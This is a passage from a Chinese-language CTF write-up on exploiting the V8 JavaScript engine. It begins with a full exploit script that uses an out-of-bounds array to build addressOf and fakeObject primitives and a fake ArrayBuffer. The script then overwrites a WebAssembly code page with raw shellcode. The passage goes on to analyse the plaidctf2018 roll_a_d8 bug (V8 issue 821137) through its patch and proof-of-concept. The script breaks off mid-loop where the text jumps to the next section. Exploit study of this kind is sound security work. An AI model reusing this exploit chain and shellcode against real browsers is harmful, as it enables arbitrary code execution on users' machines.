    a.coin(0x666,val); //溢出写arb_double_arr的size
构造出oob数组以后，我们就可以利用之前介绍的方法利用了。  
exp
    var buf = new ArrayBuffer(0x8);
    var dv = new DataView(buf);
    function p64f(value1,value2) {
       dv.setUint32(0,value1,true);
       dv.setUint32(0x4,value2,true);
       return dv.getFloat64(0,true);
    }
    function i2f64(value) {
       dv.setBigUint64(0,BigInt(value),true);
       return dv.getFloat64(0,true);
    }
    function u64f(value) {
       dv.setFloat64(0,value,true);
       return dv.getBigUint64(0,true);
    }
    var val = {
       valueOf:function() {
          a.length = 0x100;
          return 0xffffffff;
       }
    };
    var a = new Array(30);
    var arb_double_arr = [1.1,2.2];
    a.coin(0x666,val); //溢出写arb_float_arr的size
    //获取double element的map
    var double_element_map = arb_double_arr[2];
    var b = new Array(30);
    var obj = {};
    var obj_arr = [obj];
    var obj_element_map = arb_double_arr[0x13a];
    function addressOf(obj1) {
       obj_arr[0] = obj1;
       arb_double_arr[0x13a] = double_element_map;
       var addr = u64f(obj_arr[0]) - 0x1n;
       arb_double_arr[0x13a] = obj_element_map;
       return addr;
    }
    function addressOf2(obj1) {
       obj_arr[0] = obj1;
       arb_double_arr[0x13a] = double_element_map;
       var addr = u64f(obj_arr[0]) - 0x1n;
       arb_double_arr[0x13a] = obj_element_map;
       return addr;
    }
    function fakeObject(addr) {
       arb_double_arr[0x13a] = double_element_map;
       obj_arr[0] = i2f64(addr + 1n);
       arb_double_arr[0x13a] = obj_element_map;
       var mobj = obj_arr[0];
       return mobj;
    }
    const wasmCode = new Uint8Array([0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,0x60,0x00,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x04,0x84,0x80,0x80,0x80,0x00,0x01,0x70,0x00,0x00,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,0x01,0x06,0x81,0x80,0x80,0x80,0x00,0x00,0x07,0x91,0x80,0x80,0x80,0x00,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00,0x0A,0x8A,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x41,0x2A,0x0B]);
    const shellcode = new Uint32Array([186,114176,46071808,3087007744,41,2303198479,3091735556,487129090,16777343,608471368,1153910792,4132,2370306048,1208493172,3122936971,16,10936,1208291072,1210334347,50887,565706752,251658240,1015760901,3334948900,1,8632,1208291072,1210334347,181959,565706752,251658240,800606213,795765090,1207986291,1210320009,1210334349,50887,3343384576,194,3913728,84869120]);
    var wasmModule = new WebAssembly.Module(wasmCode);
    var wasmInstance = new WebAssembly.Instance(wasmModule);
    var func = wasmInstance.exports.main;
    var faker = [0.0,1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9];
    var faker_addr = addressOf(faker);
    //alert('wasm='+addressOf(wasmInstance).toString(16));
    wasm_shellcode_ptr_addr = addressOf2(wasmInstance) + 0x88n;
    var element_addr = faker_addr - 0x50n;
    //print('element_addr=' + element_addr.toString(16));
    //fake a ArrayBuffer's Map
    faker[0] = i2f64(0n);
    faker[1] = i2f64(0x1900042317080808n);
    faker[2] = i2f64(0x00000000082003ffn);
    faker[3] = i2f64(0);
    //faker a ArrayBuffer
    faker[4] = i2f64(element_addr+0x1n); //map
    faker[5] = i2f64(0); //properties
    faker[6] = i2f64(0); //elements
    faker[7] = p64f(0xffffffff,0); //length
    faker[8] = i2f64(wasm_shellcode_ptr_addr);
    faker[9] = 0x2;
    var arb_ArrayBuffer = fakeObject(element_addr+0x20n);
    var adv = new DataView(arb_ArrayBuffer);
    var wasm_shellcode_addr = adv.getBigUint64(0,true);
    //alert('wasm_shellcode_addr=' + wasm_shellcode_addr.toString(16));
    faker[8] = i2f64(wasm_shellcode_addr);
    //替换wasm的shellcode
    for (var i=0;i
###  0x03.01 plaidctf2018-roll_a_d8
####  patch分析
    diff --git a/src/builtins/builtins-array-gen.cc b/src/builtins/builtins-array-gen.cc
    index dcf3be4..3a74342 100644
    --- a/src/builtins/builtins-array-gen.cc
    +++ b/src/builtins/builtins-array-gen.cc
    @@ -1945,10 +1945,13 @@
       void GenerateSetLength(TNode context, TNode array,
                              TNode length) {
         Label fast(this), runtime(this), done(this);
    +    // TODO(delphick): We should be able to skip the fast set altogether, if the
    +    // length already equals the expected length, which it always is now on the
    +    // fast path.
         // Only set the length in this stub if
         // 1) the array has fast elements,
         // 2) the length is writable,
    -    // 3) the new length is greater than or equal to the old length.
    +    // 3) the new length is equal to the old length.
         // 1) Check that the array has fast elements.
         // TODO(delphick): Consider changing this since it does an an unnecessary
    @@ -1970,10 +1973,10 @@
           // BranchIfFastJSArray above.
           EnsureArrayLengthWritable(LoadMap(fast_array), &runtime);
    -      // 3) If the created array already has a length greater than required,
    +      // 3) If the created array's length does not match the required length,
           //    then use the runtime to set the property as that will insert holes
    -      //    into the excess elements and/or shrink the backing store.
    -      GotoIf(SmiLessThan(length_smi, old_length), &runtime);
    +      //    into excess elements or shrink the backing store as appropriate.
    +      GotoIf(SmiNotEqual(length_smi, old_length), &runtime);
           StoreObjectFieldNoWriteBarrier(fast_array, JSArray::kLengthOffset,
                                          length_smi);
    diff --git a/test/mjsunit/regress/regress-821137.js b/test/mjsunit/regress/regress-821137.js
    new file mode 100644
    index 0000000..639b3b9
    --- /dev/null
    +++ b/test/mjsunit/regress/regress-821137.js
    @@ -0,0 +1,27 @@
    +// Copyright 2018 the V8 project authors. All rights reserved.
    +// Use of this source code is governed by a BSD-style license that can be
    +// found in the LICENSE file.
    +
    +// Tests that creating an iterator that shrinks the array populated by
    +// Array.from does not lead to out of bounds writes.
    +let oobArray = [];
    +let maxSize = 1028 * 8;
    +Array.from.call(function() { return oobArray }, {[Symbol.iterator] : _ => (
    +  {
    +    counter : 0,
    +    next() {
    +      let result = this.counter++;
    +      if (this.counter > maxSize) {
    +        oobArray.length = 0;
    +        return {done: true};
    +      } else {
    +        return {value: result, done: false};
    +      }
    +    }
    +  }
    +) });
    +assertEquals(oobArray.length, maxSize);
    +
    +// iterator reset the length to 0 just before returning done, so this will crash
    +// if the backing store was not resized correctly.
    +oobArray[oobArray.length - 1] = 0x41414141;
这题并不是patch引入漏洞，而是patch修复了漏洞，这是一个真实存在于v8中的历史漏洞，并且从patch中可以知道其代号为`821137`，我们在github上搜索一下代号找到一个commit，点击parent，获得其存在漏洞的那个commit为`1dab065bb4025bdd663ba12e2e976c34c3fa6599`，于是使用`git
checkout 1dab065bb4025bdd663ba12e2e976c34c3fa6599`，然后编译v8即可。  
从patch中可以看到，已经有POC了，我们来分析一下POC的原理。  
首先，漏洞出在`GenerateSetLength`函数，那么我们查找一下该函数的上层调用，发现其在
    // ES #sec-array.from
    TF_BUILTIN(ArrayFrom, ArrayPopulatorAssembler)
函数中被调用，处`bootstrapper.cc`中可以知道该函数是`Array.from`的具体实现
        SimpleInstallFunction(array_function, "from", Builtins::kArrayFrom, 1,
                              false);
该函数的作用是通过一个迭代器为数组元素赋值，用法如下
    let arr = [6,6,6,6];
    Array.from.call(function() { return arr }, {[Symbol.iterator] : _ => (
      {
        counter : 0,
        next() {
          let result = this.counter++;
          if (this.counter > 10) {
            return {done: true};
          } else {
            return {value: result, done: false};
          }
        }
      }
    ) });
    print(arr);
输出如下
    root@ubuntu:~/Desktop/plaidctf2018-roll_a_d8/x64.debug# ./d8 poc.js
    0,1,2,3,4,5,6,7,8,9
其中`[Symbol.iterator]`是固定语法，表明这是一个迭代器，我们只需要重写迭代器里的`next`函数即可实现自己的逻辑。  
我们先看到`TF_BUILTIN(ArrayFrom, ArrayPopulatorAssembler)`函数中迭代的逻辑
    BIND(&loop);
        {
          // Loop while iterator is not done.
          TNode next = CAST(iterator_assembler.IteratorStep(
              context, iterator_record, &loop_done, fast_iterator_result_map));
          TVARIABLE(Object, value,
                    CAST(iterator_assembler.IteratorValue(
                        context, next, fast_iterator_result_map)));
          // If a map_function is supplied then call it (using this_arg as
          // receiver), on the value returned from the iterator. Exceptions are
          // caught so the iterator can be closed.
          {
            Label next(this);
            GotoIf(IsUndefined(map_function), &next);
            CSA_ASSERT(this, IsCallable(map_function));
            Node* v = CallJS(CodeFactory::Call(isolate()), context, map_function,
                             this_arg, value.value(), index.value());
            GotoIfException(v, &on_exception, &var_exception);
            value = CAST(v);
            Goto(&next);
            BIND(&next);
          }
          // Store the result in the output object (catching any exceptions so the
          // iterator can be closed).
          Node* define_status =
              CallRuntime(Runtime::kCreateDataProperty, context, array.value(),
                          index.value(), value.value());
          GotoIfException(define_status, &on_exception, &var_exception);
          index = NumberInc(index.value());
          // The spec requires that we throw an exception if index reaches 2^53-1,
          // but an empty loop would take >100 days to do this many iterations. To
          // actually run for that long would require an iterator that never set
          // done to true and a target array which somehow never ran out of memory,
          // e.g. a proxy that discarded the values. Ignoring this case just means
          // we would repeatedly call CreateDataProperty with index = 2^53.
          CSA_ASSERT_BRANCH(this, [&](Label* ok, Label* not_ok) {
            BranchIfNumberRelationalComparison(Operation::kLessThan, index.value(),
                                               NumberConstant(kMaxSafeInteger), ok,
                                               not_ok);
          });
          Goto(&loop);
        }
        BIND(&loop_done);
        {
          length = index;
          Goto(&finished);
        }
可以看到当迭代完成也就是`loop_done`的时候，将迭代次数`index`赋值给了`length`变量，然后最后，调用`GenerateSetLength`函数将这个length设置到array对象里